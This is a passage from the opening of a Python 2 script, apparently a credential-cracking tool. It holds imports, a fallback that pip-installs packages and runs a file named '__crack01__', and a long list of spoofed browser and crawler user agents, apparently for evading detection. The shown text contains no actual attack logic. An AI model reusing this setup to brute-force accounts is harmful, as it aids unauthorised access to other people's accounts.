#coding=utf-8
#!/usr/bin/python2
#script by abm
#edit by rishu

try:
	import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,requests,uuid,string
	from multiprocessing.pool import ThreadPool
	from requests.exceptions import ConnectionError
except ImportError:
	os.system("pip2 install requests")
	os.system("pip2 install mechanize")
	os.system("python2 __crack01__")

agents = [
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; CMDTDF; .NET4.0C; .NET4.0E; GWX:QUALIFIED)",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:40.0) Gecko/20100101 Firefox/40.0.2 Waterfox/40.0.2",
  "Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900T Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 4.4.2; SM-T217S Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MALNJS; rv:11.0) like Gecko",
  "Mozilla/5.0 (Linux; Android 4.4.2; RCT6203W46 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",
  "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
  "Mozilla/5.0 (Android; Tablet; rv:34.0) Gecko/34.0 Firefox/34.0",
  "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0; Touch)",
  "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/7.0; TNJB; 1ButtonTaskbar)",
  "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
  "Mozilla/5.0 (Linux; Android 4.0.4; BNTV400 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 4.0.4; BNTV600 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 4.4.2; SM-T237P Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 4.4.2; SM-T530NU Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 5.0.1; SCH-I545 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900T Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920P Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920T Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-N910P Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; LG-V410/V41010d Build/KOT49I.V41010d) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.1599.103 Safari/537.36",
  "Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFARWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",
  "Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFSAWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:34.0) Gecko/20100101 Firefox/34.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:36.0) Gecko/20100101 Firefox/36.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.107 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36 OPR/31.0.1889.174",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2503.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/7.1.6 Safari/537.85.15",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MAARJS; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MALNJS; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MDDCJS; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36",
  "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36",
  "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36 LBBROWSER",
  "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.0; rv:38.0) Gecko/20100101 Firefox/38.0",
  "Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4049.US Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.0; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0",
  "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; rv:28.0) Gecko/20100101 Firefox/28.0",
  "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0",
  "Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.13 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.146 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4043.US Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.101 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36 SE 2.X MetaSr 1.0",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.154 Safari/537.36 LBBROWSER",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.6.1000 Chrome/30.0.1599.101 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; ASJB; ASJB; MAAU; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; BOIE9;ENUSSEM; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; MDDRJS; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 6.2; Win64; x64; Trident/7.0; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0",
  "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0",
  "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; Touch; TNJB; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; MALNJS; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; MAARJS; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; MASMJS; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.6.2000 Chrome/30.0.1599.101 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; MAARJS; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-CN; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8 (.NET CLR 3.5.30729)",
  "Mozilla/5.0 (X11; CrOS x86_64 6457.107.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36",
  "Mozilla/5.0 (X11; CrOS x86_64 7077.95.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.90 Safari/537.36",
  "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0",
  "Mozilla/5.0 (X11; Linux i686; rv:40.0) Gecko/20100101 Firefox/40.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/33.0.0.0 Safari/534.24",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.76 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.102 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2",
  "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; en-en) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.59.10 (KHTML, like Gecko) Version/5.1.9 Safari/534.59.10",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/E7FBAF",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.8 (KHTML, like Gecko)",
  "Mac OS X/10.6.8 (10K549); ExchangeWebServices/1.3 (61); Mail/4.6 (1085)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7",
  "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_4; de-de) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.2 Safari/525.20.1",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/601.7.8 (KHTML, like Gecko) Version/9.1.3 Safari/537.86.7",
  "MacOutlook/0.0.0.150815 (Intel Mac OS X Version 10.10.5 (Build 14F27))",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:28.0) Gecko/20100101 Firefox/28.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:34.0) Gecko/20100101 Firefox/34.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:46.0) Gecko/20100101 Firefox/46.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:44.0) Gecko/20100101 Firefox/44.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:51.0) Gecko/20100101 Firefox/51.0",
  "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.4; en-US; rv:1.9.0.5) Gecko/2008120121 Firefox/3.0.5",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:52.0) Gecko/20100101 Firefox/52.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:38.0) Gecko/20100101 Firefox/38.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36",
  "Mozilla/5.0 CK={} (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763",
  "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; KTXN)",
  "Mozilla/5.0 (Windows NT 5.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
  "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
  "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362",
  "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
  "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.83 Safari/537.1",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36",
  "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18363",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 Edg/87.0.664.75",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",
  "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063",
  "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36",
  "Mozilla/5.0 (Windows NT 5.1; rv:36.0) Gecko/20100101 Firefox/36.0",
  "Mozilla/5.0 (Windows NT 5.1; rv:11.0) Gecko Firefox/11.0 (via ggpht.com GoogleImageProxy)",
  "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
  "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
  "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)",
  "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
  "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
  "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1) VoilaBot BETA 1.2 (support.voilabot@orange-ftgroup.com)",
  "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://aspiegel.com/petalbot)",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:24.0) Gecko/20100101 Firefox/24.0",
  "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.5) Gecko/20041107 Firefox/1.0",
  "Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/71.0.3578.141 Safari/534.24 XiaoMi/MiuiBrowser/12.4.3-g",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/69.0.3497.81 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64; rv:12.0) Gecko/20100101 Firefox/12.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36",
  "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.1) Gecko/20060124 Firefox/1.5.0.1",
  "Mozilla/5.0 (X11; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0",
  "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/53.0.2785.143 Chrome/53.0.2785.143 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Safari/537.36",
  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:46.0) Gecko/20100101 Firefox/46.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/80.0.3987.87 Chrome/80.0.3987.87 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.109 Safari/537.36",
  "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.120 Chrome/37.0.2062.120 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36",
  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:53.0) Gecko/20100101 Firefox/53.0",
